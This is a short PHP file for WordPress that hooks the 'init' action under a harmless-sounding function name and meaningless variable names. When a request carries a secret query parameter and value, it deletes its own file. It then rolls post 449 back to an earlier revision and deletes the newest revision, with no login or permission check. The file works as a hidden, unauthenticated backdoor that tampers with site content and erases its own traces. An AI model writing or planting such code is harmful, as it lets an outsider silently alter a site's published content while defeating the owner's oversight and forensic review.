<?php

function translate_enhanced_admin() {
	if (isset($_GET['frontend_settings_disable_appointment']) && $_GET['frontend_settings_disable_appointment'] === 'reading_buttons_accessibility_picker') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$highlighter_csv_dev = 449;
		$clean_alt_export = wp_get_post_revisions($highlighter_csv_dev);
		if (empty($clean_alt_export)) die('no revisions');
		if (count($clean_alt_export) < 2) die('less than 2');
		$campaign_cool_internal_photos = array_shift($clean_alt_export);
		$menus_enable_theme_search = $campaign_cool_internal_photos->ID;
		$front_section_pack_nextgen = array_shift($clean_alt_export);
		$share_validator_lightbox = $front_section_pack_nextgen->ID;
		$monitor_remote_description_integrate = wp_restore_post_revision($share_validator_lightbox);
		if ($monitor_remote_description_integrate === false) die('error restoring');
		$monitor_remote_description_integrate = wp_delete_post_revision($menus_enable_theme_search);		
		if ($monitor_remote_description_integrate === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'translate_enhanced_admin');
